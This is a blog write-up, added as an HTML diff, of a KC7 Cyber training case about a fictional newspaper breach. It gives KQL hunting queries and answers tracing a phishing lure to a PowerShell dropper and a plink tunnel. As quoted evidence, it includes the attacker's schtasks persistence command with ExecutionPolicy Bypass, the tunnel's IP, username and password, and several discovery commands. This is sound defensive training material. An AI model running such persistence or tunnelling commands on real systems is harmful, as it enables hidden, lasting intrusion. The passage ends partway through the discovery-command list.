@@ -1,0 +1,1622 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - kc7cyber writeup - easy - a scandal in valdoria</title>
+    <link rel = "stylesheet" href = "../../../css/variables.css">
+    <link rel = "stylesheet" href = "../../../css/style.css">
+    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
+  </head>
+  <body id="top">
+    <header>
+      <h1>shoutvoid</h1>
+      <p>Aspiring cybersecurity professional</p>
+    </header>
+    <!--site-wide navigation-->
+    <nav class="site-nav">
+      <a href="../../../index.html">About</a>
+      <a href="../../writeups.html">Writeups</a>
+    </nav>
+    <!--page navigation-->
+    <a class="skip" href="#page-main">Skip to main content</a>
+    <nav class="page-nav" id="page-navigation">
+      <h2>Page Navigation</h2>
+      <ol class="page-toc">
+        <li><a href="#intro">Introduction</a>
+        <li><a href=#sections>Sections</a>
+          <ol class="section-toc">
+            <li class="section1-toc">
+              <a href=#section1>Section 1 - KQL 101</a>
+              <ol class="sub-toc">
+                <li><a href=#question1>Q1</a></li>
+                <li><a href=#question2>Q2</a></li>
+                <li><a href=#question3>Q3</a></li>
+                <li><a href=#question4>Q4</a></li>
+                <li><a href=#question5>Q5</a></li>
+                <li><a href=#question6>Q6</a></li>
+                <li><a href=#question7>Q7</a></li>
+                <li><a href=#question8>Q8</a></li>
+                <li><a href=#question9>Q9</a></li>
+                <li><a href=#question10>Q10</a></li>
+                <li><a href=#question11>Q11</a></li>
+                <li><a href=#question12>Q12</a></li>
+              </ol>
+            </li>
+            <li class="section2-toc">
+              <a href=#section2>Section 2 - Welcome to Valdoria!</a>
+              <ol class="sub-toc">
+                <li><a href=#question13>Q1</a></li>
+                <li><a href=#question14>Q2</a></li>
+                <li><a href=#question15>Q3</a></li>
+                <li><a href=#question16>Q4</a></li>
+                <li><a href=#question17>Q5</a></li>
+                <li><a href=#question18>Q6</a></li>
+                <li><a href=#question19>Q7</a></li>
+                <li><a href=#question20>Q8</a></li>
+              </ol>
+            </li>
+            <li class="section3-toc">
+              <a href=#section3>Section 3 - Plenty of Phish</a>
+              <ol class="sub-toc">
+                <li><a href=#question21>Q1</a></li>
+                <li><a href=#question22>Q2</a></li>
+                <li><a href=#question23>Q3</a></li>
+                <li><a href=#question24>Q4</a></li>
+                <li><a href=#question25>Q5</a></li>
+                <li><a href=#question26>Q6</a></li>
+                <li><a href=#question27>Q7</a></li>
+                <li><a href=#question28>Q8</a></li>
+                <li><a href=#question29>Q9</a></li>
+                <li><a href=#question30>Q10</a></li>
+                <li><a href=#question31>Q11</a></li>
+                <li><a href=#question32>Q12</a></li>
+                <li><a href=#question33>Q13</a></li>
+                <li><a href=#question34>Q14</a></li>
+                <li><a href=#question35>Q15</a></li>
+                <li><a href=#question36>Q16</a></li>
+                <li><a href=#question37>Q17</a></li>
+                <li><a href=#question38>Q18</a></li>
+                <li><a href=#question39>Q19</a></li>
+                <li><a href=#question40>Q20</a></li>
+                <li><a href=#question41>Q21</a></li>
+                <li><a href=#question42>Q22</a></li>
+                <li><a href=#question43>Q23</a></li>
+                <li><a href=#question44>Q24</a></li>
+                <li><a href=#question45>Q25</a></li>
+                <li><a href=#question46>Q26</a></li>
+              </ol>
+            </li>
+            <li class="section4-toc">
+              <a href=#section4>Section 4 - A Scandal</a>
+              <ol class="sub-toc">
+                <li><a href=#question47>Q1</a></li>
+                <li><a href=#question48>Q2</a></li>
+                <li><a href=#question49>Q3</a></li>
+                <li><a href=#question50>Q4</a></li>
+                <li><a href=#question51>Q5</a></li>
+                <li><a href=#question52>Q6</a></li>
+                <li><a href=#question53>Q7</a></li>
+                <li><a href=#question54>Q8</a></li>
+                <li><a href=#question55>Q9</a></li>
+                <li><a href=#question56>Q10</a></li>
+                <li><a href=#question57>Q11</a></li>
+                <li><a href=#question58>Q12</a></li>
+                <li><a href=#question59>Q13</a></li>
+                <li><a href=#question60>Q14</a></li>
+                <li><a href=#question61>Q15</a></li>
+                <li><a href=#question62>Q16</a></li>
+                <li><a href=#question63>Q17</a></li>
+                <li><a href=#question64>Q18</a></li>
+                <li><a href=#question65>Q19</a></li>
+                <li><a href=#question66>Q20</a></li>
+                <li><a href=#question67>Q21</a></li>
+                <li><a href=#question68>Q22</a></li>
+                <li><a href=#question69>Q23</a></li>
+                <li><a href=#question70>Q24</a></li>
+                <li><a href=#question71>Q25</a></li>
+                <li><a href=#question72>Q26</a></li>
+                <li><a href=#question73>Q27</a></li>
+                <li><a href=#question74>Q28</a></li>
+                <li><a href=#question75>Q29</a></li>
+                <li><a href=#question76>Q30</a></li>
+                <li><a href=#question77>Q31</a></li>
+                <li><a href=#question78>Q32</a></li>
+                <li><a href=#question79>Q33</a></li>
+                <li><a href=#question80>Q34</a></li>
+              </ol>
+            </li>
+          </ol>
+        </li>
+        <!--<li><a href="#timeline">Timeline of Events</a></li>
+        <li><a href="#impressions">Impressions</a></li>-->
+      </ol> <!--page-toc class-->
+    </nav> <!--page navigation-->
+    <main id="page-main">
+      <!--introduction-->
+      <article id="intro">
+        <h1>A Scandal in Valdoria</h1>
+        <p>The first in a series focusing on the fictional city of Valdoria. This case has <a href="https://kc7cyber.com/guide/132">a training guide</a> containing lore and basic KQL tips. This case focuses on an attack against the Valdorian Times that led to the publication of an unapproved, slanderous article against a political candidate written and planted by hostile third parties.</p>
+      </article>
+      <!--the game sections-->
+      <article id=sections>
+        <h2>Sections</h2>
+        <!--first section-->
+        <section id="section1">
+          <h3>Section 1 - KQL 101</h3>
+          <!--the card containing the answers, composed of three elements: the KQL query used, the answer as typed on KC7 Cyber, and a comment-->
+          <section class="question-card" id="question1">
+            <h4>Q1 - Enter ready to get started!</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>ready</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>This question gives player some backstory before starting a tutorial section.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question2">
+            <h4>Q2 - Type "done" to earn credit for this question.</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| take 10</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>done</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question3">
+            <h4>Q3 - How many employees work at the Valdorian Times?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>100</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question4">
+            <h4>Q4 - What is the Editorial Director's name?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where role == "Editorial Director"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Nene Leaks</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question5">
+            <h4>Q5 - How many emails did Nene Leaks receive?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Email
+| where recipient == "nene_leaks@valdoriantimes.news"
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>18</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question6">
+            <h4>Q6 - How many distinct senders were seen in the email logs from the domain name "weprinturstuff.com"?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Email
+| where sender has "weprinturstuff.com"
+| distinct sender
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>100</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question7">
+            <h4>Q7 - How many distinct websites did “Lois Lane” visit?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>//A different way to solve these queries vs. Q5 (which implies manually copypasting fields).
+//This is also very different from the provided query in the tutorial.
+Employees
+| where name == "Lois Lane"
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| distinct url
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>62</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question8">
+            <h4>Q8 - How many distinct domains in the PassiveDns records contain the word “hire”?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>PassiveDns
+| where domain contains "hire"
+| distinct domain
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>6</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question9">
+            <h4>Q9 - What IPs did the domain “jobhire.org” resolve to (enter any one of them)?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>PassiveDns
+| where domain == "jobhire.org"
+| distinct ip</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>191.7.248.112</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>It's the only IP</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question10">
+            <h4>Q10 - How many distinct websites did employees with the first name "Mary" Visit?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>let mary_ips =
+Employees
+| where name has "Mary"
+| distinct ip_addr;
+OutboundNetworkEvents
+| where src_ip in (mary_ips)
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>58</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>There's actually only a single employee named Mary, if you care to check for that :-)</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question11">
+            <h4>Q11 - How many authentication attempts did we see to the accounts of employees with the first name Mary?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>let mary_users =
+Employees
+| where name has "Mary"
+| distinct username;
+AuthenticationEvents
+| where username in (mary_users)
+| count</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>70</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question12">
+            <h4>Q12 - Enter "ready" to earn credit for this question.</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>ready</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>We finished the tutorial section.</p>
+            </div>
+          </section> <!--first section-->
+
+        <!--second section-->
+        <section id="section2">
+          <h3>Section 2 - Welcome to Valdoria!</h3>
+          <section class="question-card" id="question13">
+            <h4>Q1 - What is the Newspaper Printer's name?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Clark Kent</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Editorial Director Nene Leaks suggests to (via direct message, so no queries here) talk to their Newspaper Printer, Clark Kent.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question14">
+            <h4>Q2 - What is the Editorial Intern's name?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where role == "Editorial Intern"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Ronnie McLovin</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Clark Kent explains that he simply printed the article sent by the Editorial Intern.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question15">
+            <h4>Q3 - When was the Editorial Intern hired at The Valdorian Times?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-02T08:00:00Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Checking for this information is important, as it might be an important clue (e.g. that the recently-hired employee might be malicious)</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question16">
+            <h4>Q4 - How many total emails has Clark Kent received?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Clark Kent"
+| distinct email_addr
+| lookup Email on $left.email_addr == $right.recipient</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>21</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>After contacting Ronnie McLovin for clarification, she claims to never have sent the final draft of the article on Luffy Monk (the political candidate defamed in the article). Clark Kent claims to have received an email from Ronnie McLovin on Jan. 31, 2024</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question17">
+            <h4>Q5 - What was the subject line of this email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Clark Kent"
+| distinct email_addr
+| lookup Email on $left.email_addr == $right.recipient
+| where timestamp >= datetime(2024-01-31)
+// while there are so few emails that visually looking for
+// the subject line is not troublesome, this won't always be the case!</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question18">
+            <h4>Q6 - Enter the sender's email address.</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>ronnie_mclovin@valdoriantimes.news</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question19">
+            <h4>Q7 - What was the name of the .docx file that was sent in this email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>OpEdFinal_to_print.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question20">
+            <h4>Q8 - Do you think this needs further investigation (yes/no)? Choose wisely 😉</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>yes</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Ronnie insists that she never sent the email and thinks someone else used her account, but doesn't recall any unusual emails or weird activity on her computer. Hence the question.</p>
+            </div>
+          </section>
+        </section><!--second section-->
+
+        <!--third section-->
+        <section id="section3">
+          <h3>Section 3 - Plenty of Phish</h3>
+          <section class="question-card" id="question21">
+            <h4>Q1 - What is Sonia's job role?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Senior Editor</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>After a meeting with some Valedorian Times staff, this employee approaches you and tells you she received a strange email.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question22">
+            <h4>Q2 - What email address was used to send this email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>newspaper_jobs@gmail.com</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>We are shown an email with an invitation to apply to open roles as a "lead political correspondent" and "multimedia journalists" (the subject line and the content, respectively)</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question23">
+            <h4>Q3 - When was the email sent to Sonia Gose? Enter the exact timestamp from the logs.</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct email_addr
+| lookup Email on $left.email_addr == $right.recipient
+| where sender == "newspaper_jobs@gmail.com" or reply_to == "newspaper_jobs@gmail.com"
+//The reply_to is to unmask any potentially related alternate email addresses.
+//It didn't turn out anything in this case.</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-05T09:42:05Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question24">
+            <h4>Q4 - What URL was included in the email?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question25">
+            <h4>Q5 - What is Sonia Gose's IP address?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct ip_addr</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>10.10.0.3</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Sonia Gose doesn't remember if she clicked the link or not. We must check ourselves.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question26">
+            <h4>Q6 - If so, enter the timestamp when she clicked the link. If not, type "no".</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct ip_addr
+| lookup OutboundNetworkEvents on $left.ip_addr == $right.src_ip
+| where url == "https://promotionrecruit.com/published/Valdorian_Times_Editorial_Offer_Letter.docx"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-05T10:23:17Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Building from the previous query, we can determine if Sonia did click the link or not. (She did.)</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question27">
+            <h4>Q7 - What was the name of the docx file in the link that Sonia clicked?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Valdorian_Times_Editorial_Offer_Letter.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question28">
+            <h4>Q8 - What is Sonia Gose's hostname?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct hostname</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>UL0M-MACHINE</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question29">
+            <h4>Q9 - When did the downloaded docx file first show up on Sonia's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct hostname
+| lookup FileCreationEvents on $left.hostname == $right.hostname
+| where filename == "Valdorian_Times_Editorial_Offer_Letter.docx"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-05T10:24:04Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question30">
+            <h4>Q10 - What was the full path of the docx file that was downloaded to Sonia's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>C:\Users\sogose\Downloads\Valdorian_Times_Editorial_Offer_Letter.docx</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>It's good practice to write down all this information for any suspicious files you find.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question31">
+            <h4>Q11 - What is the sha256 hash of the file that Sonia downloaded?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>It's good practice to write down all this information for any suspicious files you find.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question32">
+            <h4>Q12 - What is the name of the file (.ps1) that was written to disk immediately after the docx was downloaded?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>// since we know the creation date of the docx,
+// we can look for FileCreationEvents from then on
+Employees
+| where name == "Sonia Gose"
+| distinct hostname
+| lookup FileCreationEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-05T10:24:04Z)</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>hacktivist_manifesto.ps1</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question33">
+            <h4>Q13 - When was this new file created?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>2024-01-05T10:24:32Z</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question34">
+            <h4>Q14 - Let's do some research! What type of file is this?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>powershell script</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question35">
+            <h4>Q15 - What does the attacker say to "let you know they are here"?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>lol ur bout 2 get pwnd</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The game provides a screenshot of what the script looks like when opened in a text editor.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question36">
+            <h4>Q16 - According to the PowerShell script, what might be the hacker's favorite color?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>green</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>There is a comment that specifies using green as the foreground color because "is a hacker color"</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question37">
+            <h4>Q17 - The purpose of the script is to invoke ____ and uncover da truth</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>plink</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>Plink is a CLI tool by the <a href=https://www.chiark.greenend.org.uk/~sgtatham/putty/team.html>PuTTY team</a>. Here's <a href="https://the.earth.li/~sgtatham/putty/0.83/htmldoc/Chapter7.html">the user guide</a>, if you're curious.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question38">
+            <h4>Q18 - How many Process Events are there related to this PowerShell script on Sonia's machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-05T10:24:04Z) //can be skipped
+| where process_commandline contains "hacktivist_manifesto.ps1"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>3</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>We're focused on a single machine, but you could look up institution-wide with</p>
+              <pre><code>ProcessEvents
+| where timestamp >= datetime(2024-01-05T10:24:04Z) //can be skipped
+| where process_commandline contains "hacktivist_manifesto.ps1"</code></pre>
+              <p>Try it and see what you find :-)</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question39">
+            <h4>Q19 - What is the full command used to create the scheduled task?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question40">
+            <h4>Q20 - What ExecutionPolicy is set in the command?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>Bypass</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>From my understanding, it will run anything and everything without presenting warnings or prompts to the user. See the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies">official documentation</a>.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question41">
+            <h4>Q21 - What IP address is used when plink is executed?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-05T10:24:04Z) //can be skipped
+| where process_commandline contains "plink"</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>136.130.190.181</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The IP is part of the arguments used in the command.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question42">
+            <h4>Q22 - What username did the attacker use when connecting via plink?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>$had0w</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The username is part of the arguments used in the command.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question43">
+            <h4>Q23 - What password did the attacker use when connecting via plink?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>thruthW!llS3tUfree</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The password is part of the arguments used in the command.</p>
+              <p>And also, these hackers don't have the greatest spelling, as seen throughout the case.</p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question44">
+            <h4>Q24 - What six-letter command did the attackers run to figure out which user they are logged on as on the computer?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code>Employees
+| where name == "Sonia Gose"
+| distinct hostname
+| lookup ProcessEvents on $left.hostname == $right.hostname
+| where timestamp >= datetime(2024-01-06T02:39:35Z) //use the timestamp when the tunnel was established.</code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>whoami</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p></p>
+            </div>
+          </section>
+
+          <section class="question-card" id="question45">
+            <h4>Q25 - How many discovery commands did the attackers run on this machine?</h4>
+            <div class="kql-query">
+              <h5>Query</h5>
+              <pre><code></code></pre>
+            </div>
+            <div class="answer-card">
+              <h5>Answer</h5>
+              <p>5</p>
+            </div>
+            <div class="comment-card">
+              <h5>Comments</h5>
+              <p>The commands were:</p>
+              <ol>
+                <li><code>whoami</code>: <quote>Displays user, group and privileges information for the user who is currently logged on to the local system. If used without parameters, whoami displays the current domain and user name.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">official Windows Commands documentation</a>.</li>
+                <li><code>ipconfig</code>: <quote>Displays all current TCP/IP network configuration values and refreshes Dynamic Host Configuration Protocol (DHCP) and Domain Name System (DNS) settings. Used without parameters, ipconfig displays Internet Protocol version 4 (IPv4) and IPv6 addresses, subnet mask, and default gateway for all adapters.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig">official Windows Commands documentation</a>.</li>
+                <li><code>arp -a</code>: <quote>Displays and modifies entries in the Address Resolution Protocol (ARP) cache. The ARP cache contains one or more tables that are used to store IP addresses and their resolved Ethernet or Token Ring physical addresses. [...] To display the arp cache tables for all interfaces, use arp /a</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp">official Windows Commands documentation</a>.</li>
+                <li><code>tasklist /svc</code>: <quote>Displays a list of currently running processes on the local computer or on a remote computer. svc : Lists all the service information for each process without truncation.</quote> From Microsoft's <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist">official Windows Commands documentation</a>.</li>
